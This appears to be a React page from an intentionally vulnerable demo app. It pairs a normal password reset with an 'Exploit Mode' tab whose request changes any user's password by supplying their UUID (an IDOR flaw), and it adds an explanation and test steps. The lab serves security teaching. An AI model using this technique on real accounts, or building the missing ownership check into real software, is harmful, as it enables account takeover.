import { useState } from 'react';
import axios from 'axios';

const API_BASE = 'http://localhost:3001/api';

export default function AccountSettingsPage() {
  const [ownPassword, setOwnPassword] = useState('');
  const [targetUserId, setTargetUserId] = useState('');
  const [targetPassword, setTargetPassword] = useState('');
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(false);
  const [exploitMode, setExploitMode] = useState(false);
  const [activeTab, setActiveTab] = useState('own');

  const token = localStorage.getItem('vulnerableToken');
  const userId = localStorage.getItem('userId');

  const handleResetOwnPassword = async (e) => {
    e.preventDefault();
    if (!token || !userId) {
      setError('Please login first');
      return;
    }

    if (!ownPassword) {
      setError('Please enter a new password');
      return;
    }

    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const response = await axios.post(
        `${API_BASE}/users/${userId}/reset_password`,
        { new_password: ownPassword },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      setResult({
        type: 'success',
        message: 'Your password has been reset successfully.',
        data: response.data,
      });
      setOwnPassword('');
    } catch (err) {
      setError(err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  const handleExploitResetPassword = async (e) => {
    e.preventDefault();
    if (!token) {
      setError('Please login first (as attacker)');
      return;
    }

    if (!targetUserId || !targetPassword) {
      setError('Please enter target UUID and new password');
      return;
    }

    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const response = await axios.post(
        `${API_BASE}/users/${targetUserId}/reset_password`,
        { new_password: targetPassword },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      setResult({
        type: 'exploit',
        message: '🚨 EXPLOIT SUCCESSFUL! Target password has been reset.',
        data: response.data,
      });
      setTargetPassword('');
    } catch (err) {
      setError(err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6 max-w-2xl mx-auto">
      <h1 className="text-2xl font-bold">Account Settings</h1>

      {error && (
        <div className="bg-red-900 text-red-100 p-4 rounded">
          ❌ {error}
        </div>
      )}

      {result && (
        <div
          className={`p-4 rounded ${
            result.type === 'exploit'
              ? 'bg-red-900 text-red-100'
              : 'bg-green-900 text-green-100'
          }`}
        >
          <p className="font-bold mb-2">{result.message}</p>
          <pre className="bg-gray-800 p-2 rounded text-xs overflow-auto max-h-48">
            {JSON.stringify(result.data, null, 2)}
          </pre>
        </div>
      )}

      {/* Tab Navigation */}
      <div className="flex gap-2 border-b border-gray-700">
        <button
          onClick={() => setActiveTab('own')}
          className={`px-4 py-2 font-semibold ${
            activeTab === 'own'
              ? 'text-cyan-400 border-b-2 border-cyan-400'
              : 'text-gray-400 hover:text-white'
          }`}
        >
          Reset My Password
        </button>
        <button
          onClick={() => setActiveTab('target')}
          className={`px-4 py-2 font-semibold ${
            activeTab === 'target'
              ? 'text-cyan-400 border-b-2 border-cyan-400'
              : 'text-gray-400 hover:text-white'
          }`}
        >
          ⚠️ Exploit Mode
        </button>
      </div>

      {/* Reset Own Password */}
      {activeTab === 'own' && (
        <div className="bg-gray-800 p-6 rounded space-y-4">
          <h2 className="text-xl font-bold">Reset My Password</h2>

          {!token ? (
            <p className="text-gray-400">Please login first</p>
          ) : (
            <form onSubmit={handleResetOwnPassword} className="space-y-4">
              <div>
                <label className="block text-sm mb-2">New Password</label>
                <input
                  type="password"
                  value={ownPassword}
                  onChange={(e) => setOwnPassword(e.target.value)}
                  placeholder="Enter new password"
                  className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded text-white"
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 rounded font-semibold"
              >
                {loading ? 'Resetting...' : 'Reset Password'}
              </button>
            </form>
          )}

          <div className="bg-blue-900 text-blue-100 p-3 rounded text-sm">
            ℹ️ This is the <strong>normal</strong> operation. You can only reset your own password using your own token.
          </div>
        </div>
      )}

      {/* IDOR Exploit Mode */}
      {activeTab === 'target' && (
        <div className="bg-gray-800 p-6 rounded space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-bold">⚠️ IDOR Exploit: Reset Target User Password</h2>
            <div className="flex items-center">
              <input
                type="checkbox"
                id="confirmExploit"
                checked={exploitMode}
                onChange={(e) => setExploitMode(e.target.checked)}
                className="mr-2"
              />
              <label htmlFor="confirmExploit" className="text-sm">
                I understand this is an exploit
              </label>
            </div>
          </div>

          {!token ? (
            <p className="text-gray-400">Please login as attacker first</p>
          ) : (
            <form onSubmit={handleExploitResetPassword} className="space-y-4">
              <div>
                <label className="block text-sm mb-2">Target User UUID</label>
                <input
                  type="text"
                  value={targetUserId}
                  onChange={(e) => setTargetUserId(e.target.value)}
                  placeholder="Paste victim UUID from Data page"
                  className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded text-white font-mono text-sm"
                />
              </div>

              <div>
                <label className="block text-sm mb-2">New Password (for target)</label>
                <input
                  type="password"
                  value={targetPassword}
                  onChange={(e) => setTargetPassword(e.target.value)}
                  placeholder="Enter new password to set for victim"
                  className="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded text-white"
                />
              </div>

              <button
                type="submit"
                disabled={loading || !exploitMode}
                className={`w-full px-4 py-2 rounded font-semibold ${
                  exploitMode
                    ? 'bg-red-600 hover:bg-red-700 disabled:bg-gray-600'
                    : 'bg-gray-600 cursor-not-allowed'
                }`}
              >
                {loading ? 'Exploiting...' : '🔓 EXPLOIT: Reset Target Password'}
              </button>
            </form>
          )}

          <div className="bg-red-900 text-red-100 p-3 rounded text-sm">
            <strong>🚨 Vulnerability 2 (IDOR):</strong> Authenticated users can reset ANY user's password 
            by changing the target UUID in the URL/request. The server doesn't verify if the requester 
            is the owner of the account being modified.
          </div>

          <div className="bg-yellow-900 text-yellow-100 p-3 rounded text-sm">
            <strong>How to Test:</strong>
            <ol className="mt-2 space-y-1 list-decimal list-inside">
              <li>Create Account A (victim) and Account B (attacker)</li>
              <li>Login as A, get their UUID from Data page</li>
              <li>Logout, login as B (attacker)</li>
              <li>Go to Exploit Mode, paste A's UUID, enter new password</li>
              <li>Click exploit button - password changes successfully!</li>
              <li>Logout, login as A with the new password - it works!</li>
            </ol>
          </div>
        </div>
      )}
    </div>
  );
}